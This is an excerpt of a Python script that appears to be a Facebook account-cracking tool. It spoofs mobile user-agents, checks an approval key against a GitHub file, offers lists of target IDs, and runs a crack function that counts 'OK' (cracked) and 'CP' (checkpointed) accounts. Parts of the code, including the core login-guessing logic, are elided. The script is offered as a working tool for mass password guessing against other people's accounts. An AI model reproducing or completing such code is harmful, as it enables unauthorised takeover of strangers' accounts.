...
for x in range(1000):
    rr = random.randint
    rc = random.choice
    satu = f"Mozilla/5.0 (Linux; Android 12; CPH2199) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
    dua  = f"Mozilla/5.0 (Linux; Android 12; CPH2199) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
    tiga  = f"Mozilla/5.0 (Android 10; Mobile; rv:102.0) Gecko/102.0 Firefox/102.0"
    empat  = f"Mozilla/5.0 (iPad; CPU OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/98.0.4758.85 Mobile/15E148 Safari/604.1"
    lima  = f"Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-G986B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/15.0 Chrome/90.0.4430.210 Mobile Safari/537.36"
...
def contact():
	os.system('xdg-open https://www.facebook.com/profile.php?id=100086144691850')
	back()
def animation(u):
...
def approval():
  os.system('git pull')
  time.sleep(1)
  uuid = str(os.geteuid())+"U1"+str(os.geteuid())
  id = "AYUSH-"+"".join(uuid)
  os.system('clear')
  banner()
  info()
  animation("\033[1;32m [\u001b[32m•\033[1;32m] You Need Approval To Use This Tool   \033[1;32m")
  print("\033[1;32m [\u001b[32m•\033[1;32m] Your Key :\u001b[32m "+id);time.sleep(0.1)
  print ("""\033[1;37m----------------------------------------------""")
  try:
    httpCaht = requests.get("https://raw.githubusercontent.com/AYUSHGRX/Approvalv1.3/main/Approvalv1.3").text
    if id in httpCaht:
      animation("\032[1;97m >> Your Key Has Been Approved Successfully !!!")
      msg = str(os.geteuid())
      time.sleep(1)
      pass
    else: 
      ...
      os.system('xdg-open https://www.facebook.com/profile.php?id=100053891448891')
      time.sleep(1)
      exit()
  except: 
...
def setting():
	linex()
	print(''' [\u001b[36m1\033[1;37m] FREEFIRE IDZ 90% \n [\u001b[36m2\033[1;37m] TT IDZ 92% \n [\u001b[36m3\033[1;37m] RANDOM IDZ 100%''')
	linex()
...
def passu():
	...
	linex()
	prog = Progress(TextColumn(' [AYUSH-XD]{task.description}'))
...
def crack(idf,pwv):
	...
	fff = '%'
	prog.update(des,description=f'\r[deep_white]  {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[red] CP[/]:[red]{(cp)}')
	prog.advance(des)
	ses = requests.Session()
